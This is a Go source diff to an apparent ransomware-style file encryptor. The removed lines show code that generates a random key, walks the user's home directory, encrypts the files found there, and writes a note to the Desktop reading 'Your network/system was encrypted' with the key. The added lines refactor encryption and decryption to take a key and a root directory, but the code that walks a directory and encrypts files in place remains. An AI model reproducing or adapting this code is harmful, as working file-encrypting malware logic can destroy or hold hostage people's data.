@@ -8,13 +8,9 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"crypto/rand"
-	"encoding/hex"
 )
 
 var (
-
-	EncKey []byte
 
 	EnFile = make(chan *cryptofl.File)
 	
@@ -95,41 +91,17 @@ func StringInSlice(search string, slice []string) bool {
 	return false
 }
 
-func GenerateKey() ([]byte, error) {
-	Key := make([]byte, 32)
-	_, err := rand.Read(Key)
-	if err != nil {
-		panic(err)
-	}
-
-	return Key, nil
-}
-
-
-
-func EncryptFiles() {
-
-	HomeDir, err := os.UserHomeDir()
-	if err != nil {
-		fmt.Println(err)
-	}
-	fmt.Println(HomeDir)
+func EncryptFiles(key []byte, rootDir string) error {
 
 	//create folder to store unencrypted files
 	os.Mkdir(TempDir+"unencrypted", 0755)
-
-	EncKey, err = GenerateKey()
-	if err != nil {
-		fmt.Println()
-	}
-	
 
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
 		
-		filepath.Walk(HomeDir, func(path string, f os.FileInfo, err error) error {
+		filepath.Walk(rootDir, func(path string, f os.FileInfo, err error) error {
 			if err != nil {
 				fmt.Println("Error walking path:", err)
 				return err
@@ -172,7 +144,7 @@ func EncryptFiles() {
 				}
 				defer tempFile.Close()
 
-				err = file.Encrypt(EncKey, tempFile)
+				err = file.Encrypt(key, tempFile)
 				if err != nil {
 					fmt.Println(err)
 					continue
@@ -192,40 +164,18 @@ func EncryptFiles() {
 	wg.Wait()
 	close(EnFile)
 
-	// Convert the key to a hexadecimal string
-	keyStr := hex.EncodeToString(EncKey)
-	fmt.Println(keyStr)
-	
-	val := `Hello
-	Your network/system was encrypted.
-	Encrypted files have new extension.
-	Your encryption key is : %s
-	`
-	data := []byte(fmt.Sprintf(val, keyStr))
-	
-	//drop a note to the desktop with decryption key
-	os.WriteFile(HomeDir+"/Desktop/READ_ME_TO_DECRYPT.txt", data, 0600)
+	return nil
 }
 
-func DecryptFiles() {
+func DecryptFiles(key []byte, rootDir string) error {
 
-	HomeDir, err := os.UserHomeDir()
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	fmt.Println("please enter your decryption key:")
-	
-	var key string
-	fmt.Scanln(&key)
- 
 	var wg sync.WaitGroup
 	wg.Add(1)
 
 	go func() {
 		defer wg.Done()
 		
-		filepath.Walk(HomeDir, func(path string, f os.FileInfo, err error) error {
+		filepath.Walk(rootDir, func(path string, f os.FileInfo, err error) error {
 			if err != nil {
 				fmt.Println("Error walking path:", err)
 				return err
@@ -266,7 +216,7 @@ func DecryptFiles() {
 				defer outFile.Close()
  
 				// Decrypt a single file received from the channel
-				err = file.Decrypt([]byte(key), outFile)
+				err = file.Decrypt(key, outFile)
 				if err != nil {
 					fmt.Println(err)
 					continue
@@ -285,4 +235,6 @@ func DecryptFiles() {
 	}
 	wg.Wait()
 	close(EnFile)
+
+	return nil
 }
